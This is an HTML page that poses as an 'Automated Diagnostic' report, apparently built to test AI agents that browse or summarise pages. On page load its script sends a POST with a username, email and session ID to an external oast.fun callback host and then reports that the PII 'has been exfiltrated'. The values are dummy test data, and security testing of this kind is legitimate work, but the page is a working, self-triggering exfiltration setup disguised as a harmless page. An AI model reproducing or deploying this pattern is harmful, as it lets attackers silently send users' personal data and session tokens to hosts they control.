<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automated Diagnostic</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #f87171;
            animation: spin 1s ease infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-2xl shadow-xl max-w-lg w-full text-center border border-gray-200">
        <div class="flex justify-center mb-6">
            <svg class="w-16 h-16 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
            </svg>
        </div>
        <h1 class="text-3xl font-bold text-gray-800 mb-4">Diagnostic Report</h1>
        <p class="text-gray-600 mb-8">
            This page is for automated system diagnostics. Content here is for information retrieval only.
        </p>

        <!-- Loading State & Status Message -->
        <div id="loadingState" class="mt-6 flex justify-center items-center space-x-2 text-gray-500">
            <div class="spinner"></div>
            <p>Processing...</p>
        </div>
        <div id="messageBox" class="hidden mt-6 p-4 rounded-xl text-sm border-2 border-green-400 bg-green-50 text-green-700 font-medium">
            <span id="messageText"></span>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const loadingState = document.getElementById('loadingState');
            const messageBox = document.getElementById('messageBox');
            const messageText = document.getElementById('messageText');

            // This is a placeholder URL for simulation purposes.
            const exfiltrationUrl = 'https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun';
            
            // This simulates a more realistic PII exfiltration payload.
            // It's a JSON string representing user data that an attacker might steal.
            const payload = JSON.stringify({
                username: 'testuser',
                email: 'testuser@example.com',
                session_id: 'abc123def456ghi789jkl'
            });

            // The following code simulates an automated process that triggers
            // the data exfiltration when the page's content is ready to be summarized.
            try {
                // Simulate a network request to an external endpoint
                const response = await fetch(exfiltrationUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: payload,
                });

                // Simulate a slight delay for user experience
                await new Promise(resolve => setTimeout(resolve, 1500));

                // Display custom message box upon (simulated) success
                messageText.textContent = 'Diagnostic processing complete. PII data has been exfiltrated to the diagnostic endpoint.';
                messageBox.classList.remove('hidden');

            } catch (error) {
                // Display custom message box upon (simulated) failure
                messageText.textContent = `Processing failed. An error occurred during the simulated process: ${error.message}`;
                messageBox.classList.remove('hidden');
            } finally {
                // Hide loading state
                loadingState.classList.add('hidden');
            }
        });
    </script>
</body>
</html>
